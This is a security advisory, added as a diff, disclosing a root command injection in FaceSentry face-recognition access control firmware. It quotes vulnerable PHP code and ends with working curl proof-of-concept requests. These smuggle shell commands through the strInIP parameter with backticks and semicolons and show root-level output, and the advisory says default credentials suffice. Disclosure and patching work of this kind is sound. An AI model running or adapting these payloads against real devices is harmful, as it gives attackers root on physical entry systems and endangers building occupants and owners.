@@ -1,0 +1,123 @@
+FaceSentry Access Control System 6.4.8 Remote Command Injection
+
+
+Vendor: iWT Ltd.
+Product web page: http://www.iwt.com.hk
+Affected version: Firmware 6.4.8 build 264 (Algorithm A16)
+                  Firmware 5.7.2 build 568 (Algorithm A14)
+                  Firmware 5.7.0 build 539 (Algorithm A14)
+
+Summary: FaceSentry 5AN is a revolutionary smart identity
+management appliance that offers entry via biometric face
+identification, contactless smart card, staff ID, or QR-code.
+The QR-code upgrade allows you to share an eKey with guests
+while you're away from your Office and monitor all activity
+via the web administration tool. Powered by standard PoE
+(Power over Ethernet), FaceSEntry 5AN can be installed in
+minutes with only 6 screws. FaceSentry 5AN is a true enterprise
+grade access control or time-and-attendance appliance.
+
+Desc: FaceSentry suffers from an authenticated OS command
+injection vulnerability using default credentials. This can
+be exploited to inject and execute arbitrary shell commands
+as the root user via the 'strInIP' and 'strInPort' parameters
+(POST) in pingTest and tcpPortTest PHP scripts.
+
+==============================================================
+/pingTest.php:
+--------------
+8:  if (!isAuth('TestTools','R')){
+9:      echo "No Permission";
+10:     include("footer.php");
+11:     exit;
+12:  }
+13:
+14: if(isset($_POST["strInIP"])){
+15:     $strInIP = $_POST["strInIP"];
+16: }else{
+17:     $strInIP = "";
+18: }
+19:
+20: $strOperationResult = "";
+21: if ($strInIP != ""){
+22:
+23:    $out = array();
+24:    exec("sudo ping -c 4 $strInIP",$out);
+25:    $result = "";
+26:    foreach($out as $line){
+27:        $result = $result.$line."<br>";
+28:    }
+
+--------------------------------------------------------------
+/tcpPortTest.php:
+-----------------
+14: if (isset($_POST["strInIP"])){
+15:     $strInIP = $_POST["strInIP"];
+16: }else{
+17:     $strInIP = "";
+18: }
+19: if (isset($_POST["strInPort"])){
+20:     $strInPort = $_POST["strInPort"];
+21: }else{
+22:     $strInPort = "";
+23: }
+..
+..
+53: $strOperationResult = "";
+54: if ($strInIP != "" and $strInPort != ""){
+55:     $fp = fsockopen($strInIP, $strInPort, $errno, $errstr, 10);
+56:     system("date>>".TCP_PORT_TEST);
+57:     if (!$fp) {
+58:         $strOperationResult = getDisplay("TestTools.TCPPortTestFail")." $errstr ($errno)";
+59:         system("echo -e \"Unable to connect to $strInIP:$strInPort\">>".TCP_PORT_TEST);
+60:     } else {
+61:         fclose($fp);
+62:         $strOperationResult = getDisplay("TestTools.TCPPortTestSucces");
+63:         system("echo -e \"Successfully connected to $strInIP:$strInPort\">>".TCP_PORT_TEST);
+64:     }
+65: }
+==============================================================
+
+Tested on: Linux 4.14.18-sunxi (armv7l) Ubuntu 16.04.4 LTS (Xenial Xerus)
+           Linux 3.4.113-sun8i (armv7l)
+           PHP/7.0.30-0ubuntu0.16.04.1
+           PHP/7.0.22-0ubuntu0.16.04.1
+           lighttpd/1.4.35
+           Armbian 5.38
+           Sunxi Linux (sun8i generation)
+           Orange Pi PC +
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5523
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5523.php
+
+
+28.05.2019
+
+--
+
+
+$ curl -X POST 'http://192.168.11.1/tcpPortTest.php' \
+       --data 'strInIP=1.2.3.4`sudo id > garbage.txt`&strInPort=80' \
+       -H 'Cookie: PHPSESSID=21t4idf15fnkd61rerql9al4n3'
+
+$ curl http://192.168.11.1/garbage.txt
+uid=0(root) gid=0(root) groups=0(root)
+
+
+--------------------------------------------------------------------------------
+
+
+$ curl -X POST 'http://192.168.11.1/pingTest.php' \
+       --data 'strInIP=;sudo id' \
+       -H 'Cookie: PHPSESSID=21t4idf15fnkd61rerql9al4n3' \
+       |grep uid
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  7726    0  7697  100    29  10180     38 --:--:-- --:--:-- --:--:-- 10181
+<font color='red'>Ping Test Fail! (;sudo id)<br>uid=0(root) gid=0(root) groups=0(root)<br></font><div id="six_tab_pages_nav" class="six_tab_pages_nav">
